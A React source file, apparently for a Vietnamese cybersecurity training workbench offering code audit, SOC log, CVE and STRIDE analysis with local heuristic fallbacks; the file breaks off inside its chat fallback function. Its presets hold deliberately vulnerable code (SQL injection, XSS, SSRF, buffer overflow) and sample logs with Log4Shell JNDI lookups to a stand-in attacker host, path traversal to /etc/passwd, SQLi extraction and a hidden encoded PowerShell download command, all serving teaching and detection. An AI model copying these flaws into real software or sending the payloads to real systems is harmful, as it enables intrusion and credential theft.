import { useState, useRef } from "react"
import { Link } from "react-router-dom"
import {
  Code2,
  ScrollText,
  Bug,
  Layers,
  MessageSquare,
  ShieldCheck,
  ShieldAlert,
  AlertTriangle,
  CheckCircle2,
  Copy,
  Check,
  Clock,
  Cpu,
  Terminal,
  Send,
  RotateCcw,
  Loader2,
  LogIn,
  BookOpen,
  ArrowRight,
  Info,
} from "lucide-react"
import useAuth from "../../hooks/useAuth"
import aiService from "../../services/aiService"

// ============================================================================
// CẤU HÌNH TAB, NGÔN NGỮ & MÔ HÌNH SUY LUẬN
// ============================================================================
const WORKBENCH_TABS = [
  {
    id: "audit",
    code: "§01",
    label: "Kiểm toán Mã nguồn",
    shortLabel: "Mã nguồn",
    icon: Code2,
    subtitle: "Phân tích tĩnh (SAST) phát hiện lỗ hổng OWASP / CWE và đề xuất vá lỗi ở cấp mã nguồn.",
  },
  {
    id: "logs",
    code: "§02",
    label: "Phân tích Log SOC",
    shortLabel: "Log SOC",
    icon: ScrollText,
    subtitle: "Truy vết dấu hiệu xâm nhập từ nhật ký HTTP Access, WAF và Windows Sysmon.",
  },
  {
    id: "cve",
    code: "§03",
    label: "Tình báo CVE",
    shortLabel: "CVE",
    icon: Bug,
    subtitle: "Giải phẫu cơ chế khai thác, vector tấn công CVSS và chiến lược vá lỗi theo NVD.",
  },
  {
    id: "threat",
    code: "§04",
    label: "Mô hình hóa Mối đe dọa",
    shortLabel: "STRIDE",
    icon: Layers,
    subtitle: "Thiết kế ma trận STRIDE & chuỗi tấn công MITRE ATT&CK cho kiến trúc mục tiêu.",
  },
  {
    id: "chat",
    code: "§05",
    label: "Nghiên cứu Socratic",
    shortLabel: "Socratic",
    icon: MessageSquare,
    subtitle: "Đối thoại học thuật đa mô hình (Gemini, ChatGPT, Claude) theo phương pháp gợi mở.",
  },
]

const AUDIT_LANGUAGES = [
  { value: "java", label: "Java (Spring Boot / JDBC)" },
  { value: "javascript", label: "JavaScript (Node.js / DOM)" },
  { value: "python", label: "Python (Flask / Requests)" },
  { value: "sql", label: "SQL (T-SQL / PLpgSQL)" },
  { value: "c", label: "C (Memory / POSIX)" },
]

const CODE_PRESETS = [
  {
    id: "java-sqli",
    label: "Java · SQL Injection (CWE-89)",
    language: "java",
    code: `public User findUserByUsername(Connection conn, String username) throws SQLException {
    String sql = "SELECT id, username, role FROM users WHERE username = '" + username + "'";
    Statement stmt = conn.createStatement();
    ResultSet rs = stmt.executeQuery(sql);
    return rs.next() ? mapUser(rs) : null;
}`,
  },
  {
    id: "js-xss",
    label: "JS · DOM & Reflected XSS (CWE-79)",
    language: "javascript",
    code: `app.get("/api/profile/preview", (req, res) => {
  const displayName = req.query.name || "Khách";
  const bioHtml = \`<div class="card"><h3>\${displayName}</h3></div>\`;
  document.getElementById("preview-pane").innerHTML = bioHtml;
  res.send(bioHtml);
});`,
  },
  {
    id: "py-ssrf",
    label: "Python · SSRF & IMDS (CWE-918)",
    language: "python",
    code: `import requests
from flask import request

@app.route("/fetch-avatar")
def fetch_avatar():
    target_url = request.args.get("url")
    # Lỗ hổng: Cho phép truy cập 169.254.169.254/latest/meta-data/
    resp = requests.get(target_url, timeout=5)
    return resp.content, 200`,
  },
  {
    id: "sql-exec",
    label: "SQL · Dynamic EXEC (CWE-89)",
    language: "sql",
    code: `CREATE PROCEDURE GetOrderHistory @CustomerCode NVARCHAR(100)
AS
BEGIN
    DECLARE @Sql NVARCHAR(MAX);
    SET @Sql = 'SELECT order_id, total_amount FROM orders WHERE code = ''' + @CustomerCode + '''';
    EXEC(@Sql);
END;`,
  },
  {
    id: "c-bof",
    label: "C · Stack Buffer Overflow (CWE-120)",
    language: "c",
    code: `#include <stdio.h>
#include <string.h>

void parse_packet_header(const char *raw_payload) {
    char header_buf[64];
    strcpy(header_buf, raw_payload);
    printf("Header: %s\\n", header_buf);
}`,
  },
]

const LOG_PRESETS = [
  {
    id: "log-log4shell",
    label: "HTTP · Log4Shell & Path Traversal",
    content: `2026-11-24T09:12:04Z 198.51.100.42 "GET /api/search?q=\${jndi:ldap://198.51.100.99:1389/Exploit} HTTP/1.1" 500 1420 "User-Agent: \${jndi:rmi://c2.attacker.invalid/a}"
2026-11-24T09:12:07Z 198.51.100.42 "GET /static/../../../../etc/passwd HTTP/1.1" 403 312 "curl/8.4.0"
2026-11-24T09:12:11Z 198.51.100.42 "POST /api/auth/login HTTP/1.1" 401 184 "python-requests/2.31"`,
  },
  {
    id: "log-sqli-bruteforce",
    label: "Nginx · SQLi UNION & Brute-Force",
    content: `203.0.113.77 - - [24/Nov/2026:14:01:12 +0700] "GET /api/products?id=1%27%20UNION%20SELECT%20username,password_hash%20FROM%20users-- HTTP/1.1" 200 4820 "sqlmap/1.8.4"
203.0.113.77 - - [24/Nov/2026:14:01:14 +0700] "POST /api/auth/login HTTP/1.1" 401 142 "Hydra-Login"
203.0.113.77 - - [24/Nov/2026:14:01:15 +0700] "POST /api/auth/login HTTP/1.1" 401 142 "Hydra-Login"
203.0.113.77 - - [24/Nov/2026:14:01:16 +0700] "POST /api/auth/login HTTP/1.1" 401 142 "Hydra-Login"`,
  },
  {
    id: "log-sysmon",
    label: "Sysmon · PowerShell EncodedCommand & LSASS",
    content: `EventID=1 UtcTime=2026-11-24 16:40:02.114 Host=WS-FIN-04 Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe CommandLine="powershell.exe -NoP -NonI -W Hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA" ParentImage=C:\\Program Files\\Microsoft Office\\WINWORD.EXE
EventID=10 UtcTime=2026-11-24 16:40:19.442 SourceImage=C:\\Users\\Public\\procdump64.exe TargetImage=C:\\Windows\\System32\\lsass.exe GrantedAccess=0x1FFFFF
EventID=3 UtcTime=2026-11-24 16:40:25.901 Image=powershell.exe DestinationIp=192.0.2.88 DestinationPort=443 Protocol=tcp`,
  },
]

const CVE_CHIPS = [
  { id: "CVE-2021-44228", tag: "Log4Shell · CVSS 10.0" },
  { id: "CVE-2023-34362", tag: "MOVEit SQLi · CVSS 9.8" },
  { id: "CVE-2024-3094", tag: "XZ Backdoor · CVSS 10.0" },
]

const THREAT_PRESETS = [
  "Kiến trúc Microservices API Gateway sử dụng JWT & OAuth2 Token Relay",
  "Hệ thống CI/CD Pipeline, Container Registry và Kubernetes Cluster sản xuất",
  "Cổng thanh toán trực tuyến kết nối CSDL tài chính và dịch vụ Cloud IMDSv1",
]

const CHAT_PROVIDERS = [
  {
    id: "gemini",
    backendValue: "GEMINI_3_8_HIGH",
    label: "Gemini",
    badgeLabel: "GEMINI 3.8 HIGH",
    description: "Phân tích kiến trúc, mô hình hóa hệ thống & đối chiếu chuẩn NIST/RFC",
  },
  {
    id: "chatgpt",
    backendValue: "CHATGPT",
    label: "ChatGPT",
    badgeLabel: "GPT-4O SOCRATIC",
    description: "Huấn luyện Red Team Socratic, gợi mở từng bước tư duy khai thác",
  },
  {
    id: "claude",
    backendValue: "CLAUDE_OPUS",
    label: "Claude",
    badgeLabel: "CLAUDE OPUS",
    description: "Kiểm toán mã nguồn chuyên sâu, giải mã log và chuẩn hóa vá lỗi",
  },
]

const CHAT_SUGGESTIONS = [
  "Tại sao Prepared Statements ngăn chặn được SQL Injection ở cấp độ biên dịch truy vấn?",
  "So sánh cơ chế bảo vệ của SameSite=Lax và Anti-CSRF Token trước tấn công CSRF.",
  "Giải thích cách Stack Canary và ASLR phối hợp cản trở khai thác Buffer Overflow.",
]

// ============================================================================
// BỘ PHÂN TÍCH MẪU HỌC THUẬT CỤC BỘ (SMART ACADEMIC FALLBACK ENGINE)
// ============================================================================
function buildAuditFallback(sourceCode, language) {
  const start = performance.now()
  const code = sourceCode || ""
  const lower = code.toLowerCase()
  const findings = []
  const recommendations = []
  const sections = []

  const hasSqlConcat =
    /(select|insert|update|delete|exec)\b/.test(lower) &&
    (/['"`]\s*\+|\+\s*['"`]|\$\{|\bstatement\b|\bexecutequery\b|\bexec\s*\(/i.test(code) ||
      /f["'].*(select|where)/i.test(code))

  if (hasSqlConcat) {
    findings.push("CWE-89 (SQL Injection): Phát hiện ghép chuỗi đầu vào trực tiếp vào câu lệnh truy vấn SQL.")
    recommendations.push("Thay thế Statement / EXEC động bằng PreparedStatement hoặc truy vấn tham số hóa (Parameterized Queries).")
    sections.push(
      `#### 1. SQL Injection (CWE-89 · Mức độ: Nghiêm trọng)\n- **Cơ chế lỗi**: Dữ liệu người dùng không được tách khỏi cây cú pháp AST của trình phân tích SQL. Kẻ tấn công có thể chèn ký tự phân tách (' OR 1=1 -- hoặc UNION SELECT) để chiếm quyền đọc/ghi toàn bộ CSDL.\n- **Bản vá chuẩn hóa**:\n\`\`\`${language || "java"}\n// Sử dụng PreparedStatement / Parameter Binding\nPreparedStatement ps = conn.prepareStatement("SELECT id, username, role FROM users WHERE username = ?");\nps.setString(1, username);\n\`\`\``
    )
  }

  if (/innerhtml|dangerouslysetinnerhtml|document\.write|res\.send\s*\(/.test(lower)) {
    findings.push("CWE-79 (Cross-Site Scripting - XSS): Dữ liệu chưa được mã hóa ngữ cảnh được đưa thẳng vào DOM hoặc HTTP Response HTML.")
    recommendations.push("Áp dụng Contextual Output Encoding, sử dụng textContent thay cho innerHTML và cấu hình Content-Security-Policy (CSP) nghiêm ngặt.")
    sections.push(
      `#### 2. Cross-Site Scripting / DOM Sink (CWE-79 · Mức độ: Cao)\n- **Cơ chế lỗi**: Phản xạ hoặc gán trực tiếp biến đầu vào vào \`innerHTML\` / HTML response cho phép thực thi mã JavaScript tùy ý trong phiên trình duyệt của nạn nhân.\n- **Bản vá chuẩn hóa**:\n\`\`\`javascript\n// An toàn: dùng textContent hoặc thư viện sanitize như DOMPurify\nel.textContent = displayName;\n\`\`\``
    )
  }

  if (/169\.254\.169\.254|requests\.get|urllib|fetch\s*\(|http\.get/.test(lower)) {
    findings.push("CWE-918 (Server-Side Request Forgery - SSRF): Máy chủ gửi yêu cầu HTTP tới URL do người dùng kiểm soát mà không kiểm tra Allowlist.")
    recommendations.push("Áp dụng Allowlist tên miền hợp lệ, chặn dải IP nội bộ (RFC 1918, 169.254.169.254) sau khi phân giải DNS và nâng cấp Cloud Metadata lên IMDSv2.")
    sections.push(
      `#### 3. Server-Side Request Forgery & IMDS Exposure (CWE-918 · Mức độ: Nghiêm trọng)\n- **Cơ chế lỗi**: Khi máy chủ gọi trực tiếp URL đầu vào, kẻ tấn công có thể ép ứng dụng truy vấn dịch vụ nội bộ hoặc AWS/GCP Metadata tại \`169.254.169.254\` để đánh cắp IAM Temporary Credentials.\n- **Bản vá chuẩn hóa**:\n\`\`\`python\n# Xác thực scheme HTTPS, kiểm tra IP sau phân giải DNS không thuộc private/link-local\nimport ipaddress, socket\nfrom urllib.parse import urlparse\n\`\`\``
    )
  }

  if (/strcpy|strcat|gets\s*\(|sprintf\s*\(/.test(lower)) {
    findings.push("CWE-120 / CWE-787 (Stack Buffer Overflow): Sử dụng hàm sao chép bộ nhớ không kiểm tra giới hạn độ dài vùng đệm.")
    recommendations.push("Chuyển sang hàm có giới hạn kích thước (snprintf, strncpy với null-terminator tường minh) và bật Flag bảo vệ biên dịch (-fstack-protector-strong -D_FORTIFY_SOURCE=2).")
    sections.push(
      `#### 4. Tràn bộ đệm ngăn xếp (CWE-120 · Mức độ: Nghiêm trọng)\n- **Cơ chế lỗi**: \`strcpy\` / \`gets\` ghi dữ liệu vượt quá kích thước mảng cục bộ (ví dụ 64 bytes), ghi đè Saved Frame Pointer và Return Address trên Stack.\n- **Bản vá chuẩn hóa**:\n\`\`\`c\nchar header_buf[64];\nsnprintf(header_buf, sizeof(header_buf), "%s", raw_payload);\n\`\`\``
    )
  }

  if (/runtime\.getruntime|processbuilder|shell\s*=\s*true|os\.system|child_process\.exec/.test(lower)) {
    findings.push("CWE-78 (OS Command Injection): Thực thi lệnh hệ điều hành qua shell có nguy cơ chèn toán tử điều phối (; && |).")
    recommendations.push("Tắt shell=True / tránh gọi /bin/sh -c; truyền tham số dưới dạng mảng đối số tách biệt.")
  }

  if (findings.length === 0) {
    findings.push(`Đã hoàn tất kiểm tra heuristic cho đoạn mã ${language.toUpperCase()} (${code.split(/\r?\n/).length} dòng).`)
    findings.push("Không phát hiện mẫu sink nguy hiểm điển hình trong phạm vi tĩnh cục bộ; cần kết hợp phân tích luồng dữ liệu (Taint Analysis) trên Backend.")
    recommendations.push("Xác thực kiểu dữ liệu đầu vào theo Whitelist Schema (Bean Validation / Zod / Pydantic).")
    recommendations.push("Đảm bảo cơ chế kiểm soát phân quyền ở tầng nghiệp vụ (OWASP ASVS V4) và không ghi log thông tin nhạy cảm.")
    sections.push(
      `#### Đánh giá Sơ bộ Kiến trúc Mã nguồn (${language.toUpperCase()})\n- Đoạn mã không chứa các hàm sink dễ nhận biết như \`Statement.executeQuery\`, \`innerHTML\` hay \`strcpy\`.\n- Để chạy mô hình phân tích luồng dữ liệu SAST đầy đủ qua Claude Opus trên máy chủ, hãy đăng nhập tài khoản học viên.`
    )
  }

  const elapsed = Math.max(12, Math.round(performance.now() - start))
  return {
    provider: "ACADEMIC_HEURISTIC",
    modelName: "CyberPath-SAST-Heuristic-v2",
    taskType: "CODE_AUDIT",
    title: `Báo cáo Kiểm toán Mã nguồn (${language.toUpperCase()}) — Phân tích Mẫu Học Thuật`,
    analysisResult: `### Kết quả Phân tích Tĩnh Theo Chuẩn CWE / OWASP ASVS\n\n${sections.join("\n\n")}`,
    keyFindings: findings,
    recommendations,
    processingTimeMs: elapsed,
  }
}

function buildLogFallback(logContent) {
  const start = performance.now()
  const text = logContent || ""
  const lower = text.toLowerCase()
  const lines = text.split(/\r?\n/).filter((l) => l.trim().length > 0)
  const ipMatches = Array.from(new Set(text.match(/\b(?:\d{1,3}\.){3}\d{1,3}\b/g) || []))
  const findings = []
  const recommendations = []
  const blocks = []

  if (/\$\{jndi:|ldap:\/\/|rmi:\/\//i.test(text)) {
    findings.push("CVE-2021-44228 / MITRE T1190: Phát hiện chuỗi payload JNDI Lookup (${jndi:ldap/rmi}) trong tham số HTTP hoặc User-Agent.")
    recommendations.push("Chặn lưu lượng Egress LDAP/RMI (port 389, 1099) ở Firewall và nâng cấp ngay Log4j2 lên phiên bản >= 2.17.1.")
    blocks.push("#### 1. Phát hiện Khai thác Log4Shell (JNDI Injection)\n- **Dấu hiệu IOC**: Chuỗi `${jndi:...}` xuất hiện nhằm ép máy chủ Java thực hiện kết nối ngược lấy Java Class độc hại từ máy chủ điều khiển (C2).")
  }

  if (/union\s+select|%27|sqlmap|sleep\(|benchmark\(/i.test(lower)) {
    findings.push("MITRE T1190 / CWE-89: Phát hiện dò quét SQL Injection tự động (UNION SELECT / User-Agent sqlmap).")
    recommendations.push("Kích hoạt luật WAF chặn chữ ký SQLi, kiểm tra log truy vấn DB thời điểm phản hồi HTTP 200 có dung lượng bất thường (4820 bytes).")
    blocks.push("#### 2. Hoạt động Trích xuất Dữ liệu SQLi (Data Enumeration)\n- **Bằng chứng**: HTTP 200 trả về tải trọng lớn bất thường sau truy vấn `UNION SELECT`, cho thấy điểm cuối có khả năng đã bị khai thác thành công.")
  }

  if (/\.\.\//i.test(text) || /etc\/passwd/i.test(lower)) {
    findings.push("CWE-22 (Path Traversal): Phát hiện chuỗi leo thang thư mục `../` nhắm vào tệp hệ thống `/etc/passwd`.")
    recommendations.push("Chuẩn hóa đường dẫn vật lý (`Path.normalize()`) và kiểm tra đường dẫn đích bắt buộc nằm trong thư mục gốc cho phép.")
  }

  if (/401/.test(text) && (lines.filter((l) => l.includes("401")).length >= 2 || /hydra/i.test(lower))) {
    findings.push("MITRE T1110 (Brute Force / Credential Stuffing): Phát hiện chuỗi đăng nhập thất bại HTTP 401 liên tiếp trong khoảng thời gian ngắn.")
    recommendations.push("Áp dụng Rate Limiting theo IP/Tài khoản, khóa tạm thời sau N lần sai và bắt buộc MFA.")
  }

  if (/encodedcommand|lsass\.exe|procdump|winword\.exe/i.test(lower)) {
    findings.push("MITRE T1059.001 & T1003.001: Phát hiện PowerShell `-EncodedCommand` sinh ra từ Office (`WINWORD.EXE`) và hành vi trích xuất bộ nhớ `lsass.exe`.")
    recommendations.push("Cô lập ngay máy trạm khỏi mạng nội bộ qua EDR, thu hồi Kerberos TGT/mật khẩu tài khoản đang đăng nhập và phân tích RAM bằng Volatility.")
    blocks.push("#### 3. Chuỗi Tấn công Đầu cuối (Sysmon Endpoint Telemetry)\n- **Process Lineage**: `WINWORD.EXE` -> `powershell.exe -EncodedCommand` (Initial Access / Execution).\n- **Credential Access**: `procdump64.exe` mở handle `0x1FFFFF` vào `lsass.exe` để dump thông tin xác thực.")
  }

  if (ipMatches.length > 0) {
    findings.push(`Địa chỉ IP liên quan trích xuất từ nhật ký (${ipMatches.length}): ${ipMatches.slice(0, 5).join(", ")}`)
  }

  if (findings.length === 0) {
    findings.push(`Đã quét ${lines.length} dòng nhật ký theo bộ chỉ báo MITRE ATT&CK / OWASP.`)
    recommendations.push("Kiểm tra tương quan thời gian (Timestamp Correlation) giữa Gateway WAF và nhật ký ứng dụng.")
    blocks.push("#### Phân tích Sơ bộ Nhật ký Hệ thống\n- Không ghi nhận chữ ký tấn công rõ rệt (JNDI, SQLMap, Path Traversal, LSASS Dump) trong đoạn log vừa dán.\n- Đăng nhập để chạy mô hình suy luận ngữ nghĩa sâu trên Backend.")
  }

  const elapsed = Math.max(10, Math.round(performance.now() - start))
  return {
    provider: "ACADEMIC_HEURISTIC",
    modelName: "CyberPath-SOC-LogParser-v2",
    taskType: "LOG_ANALYSIS",
    title: `Báo cáo Truy vết Nhật ký SOC (${lines.length} dòng sự kiện)`,
    analysisResult: `### Tổng hợp Tương quan Sự kiện An ninh (SIEM / Sysmon)\n\n${blocks.join("\n\n") || "- Đã hoàn tất trích xuất chỉ báo bất thường từ tệp nhật ký."}`,
    keyFindings: findings,
    recommendations,
    processingTimeMs: elapsed,
  }
}

const KNOWN_CVE_PROFILES = {
  "CVE-2021-44228": {
    title: "CVE-2021-44228 — Apache Log4j2 JNDI Remote Code Execution (Log4Shell)",
    analysisResult: `### Hồ sơ Tình báo Lỗ hổng CVE-2021-44228\n\n#### 1. Cơ chế Kỹ thuật (Root Cause)\n- **Thành phần ảnh hưởng**: Apache Log4j 2.x (từ 2.0-beta9 đến 2.14.1).\n- **Điểm yếu cốt lõi (CWE-502 / CWE-917)**: Tính năng Message Lookup Substitution trong Log4j2 mặc định phân giải các biểu thức \`\${jndi:ldap://...}\` khi ghi log chuỗi dữ liệu do người dùng kiểm soát (HTTP Header, tham số truy vấn).\n- **Mức độ nghiêm trọng**: CVSS v3.1 **10.0 (Critical)** — Vector \`AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H\`.`,
    keyFindings: [
      "Vector khai thác mạng từ xa không cần xác thực (Unauthenticated RCE)",
      "Ảnh hưởng dây chuyền tới hàng nghìn phần mềm trung gian Java (Spring, Elasticsearch, Kafka)",
      "Dễ dàng kích hoạt chỉ bằng 1 HTTP Header như User-Agent hoặc X-Api-Version",
    ],
    recommendations: [
      "Nâng cấp khẩn cấp thư viện log4j-core lên phiên bản >= 2.17.1 (hoặc 2.12.4 cho Java 7)",
      "Triển khai quy tắc WAF và Firewall chặn kết nối Egress LDAP (389), LDAPS (636), RMI (1099)",
      "Rà soát toàn bộ SBOM / dependency tree bằng OWASP Dependency-Check hoặc Trivy",
    ],
  },
  "CVE-2023-34362": {
    title: "CVE-2023-34362 — Progress MOVEit Transfer SQL Injection & RCE",
    analysisResult: `### Hồ sơ Tình báo Lỗ hổng CVE-2023-34362\n\n#### 1. Cơ chế Kỹ thuật (Root Cause)\n- **Thành phần ảnh hưởng**: Ứng dụng truyền tệp doanh nghiệp MOVEit Transfer.\n- **Điểm yếu cốt lõi (CWE-89)**: Lỗ hổng SQL Injection trong giao diện web cho phép kẻ tấn công chưa xác thực thao túng cấu trúc CSDL nội bộ, tạo phiên quản trị giả mạo và tải lên Webshell (LEMURLOOT) để thực thi mã từ xa.\n- **Mức độ nghiêm trọng**: CVSS v3.1 **9.8 (Critical)** — Khai thác diện rộng trong thực tế (CISA KEV).`,
    keyFindings: [
      "Kết hợp SQL Injection với leo thang đặc quyền chiếm quyền thực thi IIS Web Application",
      "Thường được nhóm tấn công khai thác tự động để trích xuất tệp nhạy cảm hàng loạt",
      "Ghi nhận dấu vết tệp độc hại human2.aspx trên máy chủ bị xâm nhập",
    ],
    recommendations: [
      "Áp dụng bản vá chính thức mới nhất từ Progress Software cho từng nhánh phiên bản MOVEit",
      "Tạm thời vô hiệu hóa lưu lượng HTTP/HTTPS công khai tới cổng quản trị cho đến khi hoàn tất vá lỗi",
      "Kiểm tra toàn vẹn thư mục wwwroot tìm kiếm các tệp .aspx lạ và xoay vòng toàn bộ khóa bí mật",
    ],
  },
  "CVE-2024-3094": {
    title: "CVE-2024-3094 — XZ Utils (liblzma) Supply Chain Backdoor",
    analysisResult: `### Hồ sơ Tình báo Lỗ hổng CVE-2024-3094\n\n#### 1. Cơ chế Kỹ thuật (Root Cause)\n- **Thành phần ảnh hưởng**: \`xz-utils\` và thư viện \`liblzma\` phiên bản 5.6.0 & 5.6.1.\n- **Điểm yếu cốt lõi (CWE-506 — Embedded Malicious Code)**: Tác nhân tấn công xây dựng lòng tin dài hạn trên dự án mã nguồn mở và cấy mã độc obfuscated vào tệp kiểm thử nhị phân cùng script build M4, can thiệp bảng IFUNC để hook hàm \`RSA_public_decrypt\` của OpenSSH \`sshd\` qua \`systemd\`.\n- **Mức độ nghiêm trọng**: CVSS v3.1 **10.0 (Critical)** — Tấn công chuỗi cung ứng tinh vi.`,
    keyFindings: [
      "Can thiệp trực tiếp quy trình xác thực khóa công khai SSH mà không để lại dấu vết trên mã nguồn C thuần túy",
      "Chỉ kích hoạt trên kiến trúc x86_64 Linux xây dựng gói .deb / .rpm khi liên kết libsystemd",
      "Được phát hiện nhờ kỹ sư phát hiện độ trễ bất thường (~500ms) và lỗi Valgrind trong phiên bản SSH thử nghiệm",
    ],
    recommendations: [
      "Hạ cấp hoặc thay thế ngay xz-utils / liblzma về bản ổn định sạch 5.4.x trên mọi ảnh container và máy chủ thử nghiệm",
      "Xác minh hàm băm SHA-256 của gói phân phối và kiểm soát tính toàn vẹn chuỗi dựng (Reproducible Builds / SLSA)",
      "Giám sát độ trễ bất thường và hành vi gọi thư viện lạ trong tiến trình sshd",
    ],
  },
}

function buildCveFallback(cveId) {
  const start = performance.now()
  const normalized = (cveId || "").trim().toUpperCase() || "CVE-CHƯA-XÁC-ĐỊNH"
  const matched = KNOWN_CVE_PROFILES[normalized]

  if (matched) {
    return {
      provider: "ACADEMIC_HEURISTIC",
      modelName: "CyberPath-CVE-Archive-v2",
      taskType: "CVE_ANALYSIS",
      title: matched.title,
      analysisResult: matched.analysisResult,
      keyFindings: matched.keyFindings,
      recommendations: matched.recommendations,
      processingTimeMs: Math.max(8, Math.round(performance.now() - start)),
    }
  }

  return {
    provider: "ACADEMIC_HEURISTIC",
    modelName: "CyberPath-CVE-Archive-v2",
    taskType: "CVE_ANALYSIS",
    title: `Khung Thẩm định Tình báo ${normalized}`,
    analysisResult: `### Phương pháp Tra cứu & Đánh giá ${normalized}\n\n#### 1. Quy trình Xác minh Chuẩn NVD / MITRE\n- **Bước 1 (Nhận diện CPE & SBOM)**: Đối chiếu mã \`${normalized}\` với danh mục thành phần phần mềm (Software Bill of Materials) để xác định chính xác dải phiên bản bị ảnh hưởng.\n- **Bước 2 (Phân tích CVSS Vector)**: Đánh giá khả năng tiếp cận (Network vs Local), điều kiện xác thực (PR:N) và tác động tam giác CIA.\n- **Bước 3 (Kiểm chứng Thực tế)**: Kiểm tra trạng thái trên danh mục **CISA Known Exploited Vulnerabilities (KEV)** và sự hiện diện của mã khai thác công khai (PoC).\n\n> *Lưu ý: Để truy vấn dữ liệu tổng hợp trực tiếp từ mô hình Gemini 3.8 High của hệ thống, vui lòng đăng nhập tài khoản.*`,
    keyFindings: [
      `Mã định danh cần thẩm định: ${normalized}`,
      "Cần đối chiếu trực tiếp chỉ số CVSS Base Score và Environmental Score theo bối cảnh mạng nội bộ",
      "Ưu tiên kiểm tra xem lỗ hổng có thuộc danh sách CISA KEV hoặc có chữ ký phát hiện Snort/Suricata hay không",
    ],
    recommendations: [
      "Tra cứu hồ sơ chính thức tại nvd.nist.gov và ghi chú phát hành (Security Advisory) của nhà cung cấp",
      "Áp dụng bù đắp ảo (Virtual Patching) qua WAF/IPS nếu chưa thể khởi động lại dịch vụ để vá lỗi ngay",
      "Cập nhật công cụ quét phụ thuộc tự động trong quy trình CI/CD",
    ],
    processingTimeMs: Math.max(9, Math.round(performance.now() - start)),
  }
}

function buildThreatFallback(topic) {
  const start = performance.now()
  const cleanTopic = (topic || "").trim() || "Kiến trúc Hệ thống Ứng dụng Doanh nghiệp"
  const lower = cleanTopic.toLowerCase()
  const isAuthApi = /jwt|oauth|api|gateway|microservice/.test(lower)
  const isCloudK8s = /cloud|k8s|kubernetes|container|imds|ci\/cd/.test(lower)

  const domainNote = isAuthApi
    ? "Phát hiện trọng tâm về xác thực liên dịch vụ (Token Relay, thuật toán ký JWT `alg:none`, Broken Object Level Authorization - BOLA)."
    : isCloudK8s
      ? "Phát hiện trọng tâm về cô lập Workload, bảo mật hình ảnh Container (Supply Chain), RBAC và chống rò rỉ Cloud Metadata (IMDSv1)."
      : "Phân tích ranh giới tin cậy (Trust Boundaries) giữa vùng DMZ công khai, tầng xử lý nghiệp vụ và tầng lưu trữ dữ liệu lõi."

  return {
    provider: "ACADEMIC_HEURISTIC",
    modelName: "CyberPath-STRIDE-Planner-v2",
    taskType: "THREAT_SCENARIO",
    title: `Mô hình hóa Mối đe dọa STRIDE & MITRE ATT&CK: ${cleanTopic}`,
    analysisResult: `### Kiến trúc Phân tích Mối đe dọa (Threat Modeling Blueprint)\n\n- **Phạm vi đánh giá**: ${cleanTopic}\n- **Trọng tâm kỹ thuật**: ${domainNote}\n\n#### 1. Ma trận Phân loại STRIDE\n1. **Spoofing (Giả mạo danh tính)**: Đánh cắp token phiên, giả mạo chữ ký JWT/OAuth2 hoặc giả mạo địa chỉ nguồn nội bộ.\n2. **Tampering (Sửa đổi dữ liệu)**: Chèn tham số trái phép (Mass Assignment), thay đổi tải trọng trên đường truyền hoặc sửa Image trong Registry.\n3. **Repudiation (Chối bỏ hành vi)**: Thiếu nhật ký kiểm toán bất biến (Immutable Audit Trail) khiến không thể truy vết người thao tác.\n4. **Information Disclosure (Rò rỉ thông tin)**: Trả về Stack Trace, lộ khóa bí mật trong biến môi trường hoặc truy vấn ngang BOLA/IDOR.\n5. **Denial of Service (Từ chối dịch vụ)**: Cạn kiệt tài nguyên do thiếu Rate Limit, truy vấn Regex phức tạp (ReDoS) hoặc bão kết nối.\n6. **Elevation of Privilege (Leo thang đặc quyền)**: Lợi dụng cấu hình sai RBAC / IAM hoặc thực thi lệnh qua lỗ hổng SSRF/RCE.\n\n#### 2. Chuỗi Chiến thuật MITRE ATT&CK Dự kiến\n- **Initial Access (TA0001)** -> **Execution (TA0002)** -> **Credential Access (TA0006)** -> **Lateral Movement (TA0008)** -> **Exfiltration (TA0010)**.`,
    keyFindings: [
      "Bao phủ đầy đủ 6 nhóm rủi ro STRIDE gắn với các ranh giới tin cậy (Trust Boundaries)",
      "Ánh xạ trực tiếp sang 5 pha trọng yếu của khung MITRE ATT&CK Enterprise",
      domainNote,
    ],
    recommendations: [
      "Áp dụng kiến trúc Zero Trust: xác thực mTLS và kiểm tra phân quyền ở từng microservice (Policy Enforcement Point)",
      "Thiết lập kiểm soát egress mạng nghiêm ngặt (NetworkPolicy) và ký số Artifact theo chuẩn SLSA",
      "Chuẩn hóa nhật ký tập trung (SIEM) kèm mã tương quan Request-ID để đáp ứng khả năng chống chối bỏ",
    ],
    processingTimeMs: Math.max(11, Math.round(performance.now() - start)),
  }
}

function buildChatFallback(message, providerId) {
  const start = performance.now()
  const providerMeta = CHAT_PROVIDERS.find((p) => p.id === providerId) || CHAT_PROVIDERS[0]
  const cleanMsg = (message || "").trim()
  const lower = cleanMsg.toLowerCase()

  let topicTitle = "Đối thoại Socratic — Tư duy Phòng thủ Chuyên sâu"
  let body
  const findings = []
  const recommendations = []

  if (/sql|prepared|statement|injection/.test(lower)) {
    topicTitle = "Giải phẫu Cơ chế Prepared Statement & Cây Cú pháp AST"
    body = `### Góc nhìn Socratic (${providerMeta.label})\n\n#### 1. Bản chất Tách biệt Mã lệnh và Dữ liệu\n- Khi sử dụng \`PreparedStatement\`, trình biên dịch SQL phân tích cú pháp (Parse) và lập kế hoạch thực thi (Execution Plan) **trước** khi giá trị tham số được truyền vào qua giao thức nhị phân.\n- Do đó, mọi ký tự đặc biệt như \`'\` hoặc \`--\` đều được xử lý thuần túy như một giá trị hằng (literal data), không bao giờ thay đổi cấu trúc cây cú pháp AST.\n\n#### 2. Câu hỏi Kiểm chứng Tư duy\n1. *Nếu lập trình viên dùng PreparedStatement cho mệnh đề \`WHERE\`, nhưng vẫn nối chuỗi ở tên cột trong \`ORDER BY\`, ứng dụng có còn bị SQL Injection không? Tại sao?*\n2. *Cơ chế nào thay thế tham số hóa khi cần truyền danh sách tên bảng hoặc thứ tự sắp xếp?* (Gợi ý: Strict Whitelist Mapping).`
    findings.push("PreparedStatement khóa cứng cấu trúc AST trước khi bind dữ liệu tham số")
    findings.push("Các định danh (Identifier: tên bảng, tên cột, ASC/DESC) không thể bind bằng placeholder `?`")
    recommendations.push("Áp dụng Whitelist ánh xạ cố định cho mọi tham số sắp xếp động (ORDER BY)")
